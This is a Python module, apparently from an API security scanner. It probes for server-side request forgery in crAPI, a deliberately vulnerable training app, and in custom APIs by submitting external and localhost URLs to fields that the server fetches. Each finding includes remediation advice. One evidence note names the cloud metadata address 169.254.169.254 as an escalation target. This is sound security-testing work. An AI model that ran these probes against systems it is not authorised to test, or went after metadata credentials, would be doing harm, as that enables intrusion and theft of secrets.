# api7_ssrf.py  FINAL CORRECT VERSION
# API7:2023  Server Side Request Forgery
#
# crAPI SSRF CONFIRMED METHOD (from official challenge docs):
#   Send mechanic_api: "https://www.google.com"
#   Google's HTML response appears INSIDE contact_mechanic response
#   This proves server made outbound HTTP request to external URL

from modules.base_module import BaseModule, Finding
from modules.generic_strategies import GenericStrategiesMixin
from typing import List


class SSRFModule(GenericStrategiesMixin, BaseModule):
    OWASP_ID = "API7:2023"
    OWASP_NAME = "Server Side Request Forgery"

    def run(self, endpoints=None) -> List[Finding]:
        print(f"\n   {self.OWASP_ID}  {self.OWASP_NAME} ")
        token_a = self.auth.get_token("user_a")
        if not token_a:
            print("  [!] No token available  skipping")
            return self.findings

        target_type = self.config.target.target_type

        if target_type == "crapi":
            self._test_crapi_ssrf(token_a)
        elif target_type == "custom":
            self._test_custom_ssrf(token_a)

        # Generic endpoint-driven test  runs on any target
        self.generic_ssrf(endpoints, token_a)

        if not self.findings:
            print("  [+] No SSRF vulnerabilities detected")
        return self.findings

    def _test_crapi_ssrf(self, token: str):
        """
        crAPI SSRF via contact_mechanic mechanic_api field.

        OFFICIAL CHALLENGE METHOD:
          Set mechanic_api = "https://www.google.com"
          Google HTML response appears inside contact_mechanic response
          This proves server made outbound request to external URL.

        Reference: crAPI Challenge 11
        """
        print("  [*] Testing SSRF on crAPI /workshop/api/merchant/contact_mechanic...")
        print("  [*] Method: mechanic_api field with external URL (Challenge 11)")

        # Get user vehicle ID first
        vehicle_id = self._get_vehicle_id(token)
        if not vehicle_id:
            print("  [!] Could not get vehicle ID  SSRF test skipped")
            return

        # Test with Google (official challenge method)
        ssrf_test_urls = [
            "https://www.google.com",
            "http://www.google.com",
            "https://google.com",
        ]

        for ssrf_url in ssrf_test_urls:
            print(f"  [*] Testing mechanic_api: {ssrf_url}")

            payload = {
                "mechanic_code": "TRAC_JHN",
                "problem_details": "ASTRA SSRF security test",
                "vehicle_id": vehicle_id,
                "mechanic_api": ssrf_url,
            }

            resp = self.requester.post(
                "/workshop/api/merchant/contact_mechanic",
                body=payload, token=token,
            )

            if not resp:
                print(f"  [!] No response for {ssrf_url}")
                continue

            print(f"  [*] Response status: {resp.status_code}")

            if resp.status_code == 200:
                resp_text = resp.text.lower()

                # Check for Google HTML content in response
                google_indicators = [
                    "google", "doctype html", "<html", "<!doctype",
                    "www.google.com", "googleapis", "gstatic",
                ]

                found_indicators = [i for i in google_indicators if i in resp_text]

                if found_indicators:
                    self.add_finding(
                        title="SSRF  External HTTP response returned via mechanic_api field",
                        severity="Critical",
                        endpoint="/workshop/api/merchant/contact_mechanic",
                        method="POST",
                        evidence={
                            "ssrf_url": ssrf_url,
                            "field": "mechanic_api",
                            "response_status": resp.status_code,
                            "google_indicators_found": found_indicators,
                            "response_preview": resp.text[:500],
                            "proof": (
                                f"Google HTML content found in API response  "
                                f"server made outbound HTTP request to {ssrf_url} "
                                f"and returned the response"
                            ),
                            "attack_escalation": (
                                "Can be used to access: internal microservices, "
                                "AWS metadata at http://169.254.169.254/latest/meta-data/, "
                                "internal databases, admin panels not exposed externally"
                            ),
                        },
                        description=(
                            "The contact_mechanic endpoint accepts a mechanic_api URL "
                            "and makes a server-side HTTP request to it, returning "
                            "the full response content to the caller. "
                            "This allows an attacker to use the server as a proxy "
                            "to reach internal or external resources."
                        ),
                        remediation=(
                            "Validate mechanic_api against a strict allowlist of trusted domains. "
                            "Block all requests to internal IP ranges. "
                            "Never return the content of fetched URLs to the client. "
                            "Implement egress filtering on the server."
                        ),
                    )
                    self.print_finding(self.findings[-1])
                    return
                else:
                    # Response was 200 but no Google content
                    # Still suspicious  server may have processed the URL
                    print(f"  [*] Got 200 but no Google indicators  checking for report_link...")
                    try:
                        data = resp.json()
                        if data.get("report_link") or data.get("mechanic_api"):
                            self.add_finding(
                                title="SSRF  Server processes user-supplied URLs in mechanic_api",
                                severity="Critical",
                                endpoint="/workshop/api/merchant/contact_mechanic",
                                method="POST",
                                evidence={
                                    "ssrf_url": ssrf_url,
                                    "field": "mechanic_api",
                                    "response_data": str(data)[:300],
                                    "note": "Server accepted and returned mechanic_api URL in response",
                                },
                                description="Server processes user-supplied URLs without validation.",
                                remediation="Validate mechanic_api against trusted allowlist.",
                            )
                            self.print_finding(self.findings[-1])
                            return
                    except Exception:
                        pass

    def _get_vehicle_id(self, token: str):
        """Get user's vehicle ID for mechanic request."""
        resp = self.requester.get(
            "/identity/api/v2/vehicle/vehicles", token=token
        )
        if resp and resp.status_code == 200:
            try:
                vehicles = resp.json()
                if vehicles:
                    return str(vehicles[0].get("id", ""))
            except Exception:
                pass
        return None

    def _test_custom_ssrf(self, token: str):
        """Custom API SSRF via vehicle import endpoint."""
        print("  [*] Testing SSRF on Custom API /vehicles/import...")

        base_url = self.config.target.base_url
        test_urls = [
            f"{base_url}/health",
            "http://localhost:9000/health",
            "http://127.0.0.1:9000/health",
            "https://www.google.com",
        ]

        for ssrf_url in test_urls:
            resp = self.requester.post(
                "/vehicles/import",
                body={"url": ssrf_url},
                token=token,
            )
            if resp and resp.status_code in [200, 201]:
                try:
                    data = resp.json()
                    fetched_status = data.get("status_code")
                    fetched_data = data.get("data", "")

                    if fetched_status is not None or fetched_data:
                        self.add_finding(
                            title="SSRF  Server fetches user-supplied URLs (vehicle import)",
                            severity="Critical",
                            endpoint="/vehicles/import",
                            method="POST",
                            evidence={
                                "ssrf_url": ssrf_url,
                                "url_field": "url",
                                "response_status": resp.status_code,
                                "fetched_url_status": fetched_status,
                                "fetched_data_preview": str(fetched_data)[:300],
                                "proof": (
                                    "Server returned status_code and data from "
                                    "the fetched URL  confirming outbound request was made"
                                ),
                            },
                            description=(
                                "Vehicle import endpoint fetches any user-supplied URL "
                                "without validation and returns the response."
                            ),
                            remediation=(
                                "Whitelist allowed domains. "
                                "Block private IP ranges: 127.x, 10.x, 169.254.x. "
                                "Never return content from fetched URLs to client."
                            ),
                        )
                        self.print_finding(self.findings[-1])
                        return
                except Exception:
                    pass
